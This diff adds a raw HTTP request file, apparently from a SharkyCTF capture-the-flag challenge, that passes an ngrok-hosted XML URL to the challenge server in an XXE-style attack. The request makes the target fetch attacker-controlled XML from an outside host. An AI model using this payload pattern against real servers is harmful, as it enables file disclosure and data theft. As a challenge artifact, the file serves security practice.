@@ -1,0 +1,10 @@
+GET /?xml=http://0.tcp.ngrok.io:4040/data.xml HTTP/1.1
+Host: xxexternalxx.sharkyctf.xyz
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
